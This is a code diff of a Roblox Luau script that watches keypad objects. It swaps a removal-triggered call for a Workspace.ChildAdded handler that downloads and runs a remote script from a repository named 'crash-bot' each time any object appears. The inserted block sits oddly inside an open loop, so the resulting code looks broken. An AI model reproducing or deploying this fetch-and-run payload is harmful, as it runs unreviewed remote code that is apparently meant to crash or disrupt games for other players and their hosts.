@@ -31,11 +31,14 @@ local foundKeypads = findGearMachineKeypads()
 -- Monitor each keypad for removal and value changes
 for _, keypad in ipairs(foundKeypads) do
     -- Monitor if the keypad is removed
-    keypad.AncestryChanged:Connect(function(_, parent)
-        if parent == nil then -- Parent becomes nil when the keypad is removed
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()
-        end
-    end)
+-- Get the Workspace service
+local Workspace = game:GetService("Workspace")
+
+-- Connect to the ChildAdded event
+Workspace.ChildAdded:Connect(function(child)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()
+end)
+
 
     -- Monitor changes to the "Number" value
     local numberValue = keypad:FindFirstChild("Number")
